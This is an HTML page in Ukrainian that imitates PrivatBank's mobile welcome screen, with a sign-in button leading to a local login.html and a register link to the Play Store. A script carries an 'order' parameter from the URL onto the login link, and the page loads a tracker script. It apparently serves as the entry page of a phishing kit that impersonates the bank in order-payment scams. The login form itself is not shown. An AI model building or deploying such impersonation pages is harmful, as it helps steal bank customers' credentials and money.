<!DOCTYPE html>
<html lang="uk" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>ПриватБанк</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
  body{
    max-width:520px;margin:0 auto;height:100vh;height:100dvh;
    background:#00A651;color:#fff;
    display:flex;flex-direction:column;position:relative;overflow:hidden;
  }
  .bg{position:absolute;inset:0;pointer-events:none;overflow:hidden;}
  .d{position:absolute;transform:rotate(45deg);background:rgba(255,255,255,0.06);}
  .d1{width:380px;height:380px;top:-100px;left:-150px;}
  .d2{width:320px;height:320px;top:180px;left:30px;}
  .d3{width:420px;height:420px;top:60px;right:-210px;left:auto;}
  .d4{width:280px;height:280px;bottom:120px;left:-110px;}
  .d5{width:360px;height:360px;bottom:-80px;right:-140px;left:auto;}

  .top{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;position:relative;z-index:2;flex-shrink:0;}
  .lang{display:flex;align-items:center;gap:6px;background:none;border:none;color:#fff;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;}
  .lang svg{width:22px;height:22px;fill:none;stroke:#fff;stroke-width:1.5}
  .arr{font-size:8px;margin-left:2px;opacity:0.8}
  .chat{width:36px;height:36px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;}
  .chat svg{width:26px;height:26px}

  .main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;z-index:2;min-height:0;padding:0 32px;}
  .logo{margin-bottom:36px}
  .logo img{height:64px;display:block}
  h1{font-size:32px;font-weight:600;text-align:center;line-height:1.2;margin-bottom:14px;letter-spacing:-0.3px;}
  .sub{color:rgba(255,255,255,0.6);font-size:14.5px;text-align:center;line-height:1.5;}

  .btns{width:100%;padding:0 20px 40px;position:relative;z-index:2;display:flex;flex-direction:column;gap:12px;flex-shrink:0;}
  .b{display:block;width:100%;padding:15px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;background:#fff;color:#00A651;text-align:center;text-decoration:none;border:none;transition:.2s;}
  .b:active{transform:scale(0.98)}
</style>
</head>
<body>
  <div class="bg">
    <div class="d d1"></div>
    <div class="d d2"></div>
    <div class="d d3"></div>
    <div class="d d4"></div>
    <div class="d d5"></div>
  </div>

  <div class="top">
    <button class="lang" type="button">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10A15.3 15.3 0 0112 2z"/></svg>
      UA <span class="arr">&#9660;</span>
    </button>
    <button class="chat" type="button">
      <svg viewBox="0 0 28 28" fill="none">
        <path d="M18 4H6.5A2.5 2.5 0 004 6.5V15a2.5 2.5 0 002.5 2.5H8v3.5l4-3.5h6a2.5 2.5 0 002.5-2.5V6.5A2.5 2.5 0 0018 4z" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
        <path d="M10 17.5V20a2.5 2.5 0 002.5 2.5H16l4 3.5V22.5h1.5A2.5 2.5 0 0024 20v-8.5a2.5 2.5 0 00-2.5-2.5H20.5" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
      </svg>
    </button>
  </div>

  <div class="main">
    <div class="logo">
      <img src="/images/privatbank-logo-white.png" alt="ПриватБанк">
    </div>
    <h1>Ласкаво просимо<br>до ПриватБанку</h1>
    <p class="sub">Доброго ранку! Увійдіть або зареєструйтесь, щоб продовжити</p>
  </div>

  <div class="btns">
    <a class="b" id="signinBtn" href="login.html">Увійти</a>
    <a class="b" id="registerBtn" href="https://play.google.com/store/apps/details?id=ua.privatbank.ap24" target="_blank" rel="noopener">Зареєструватися</a>
  </div>

  <script>
    var params = new URLSearchParams(location.search);
    var orderId = params.get("order");
    if(orderId){
      document.getElementById("signinBtn").href = "login.html?order=" + orderId;
    }
    var hour = new Date().getHours();
    var greeting = hour < 12 ? "Доброго ранку" : hour < 17 ? "Доброго дня" : "Доброго вечора";
    document.querySelector(".sub").textContent = greeting + "! Увійдіть або зареєструйтесь, щоб продовжити";
  </script>
  <script src="/footer.js"></script>
  <script src="/tracker.js"></script>
</body>
</html>
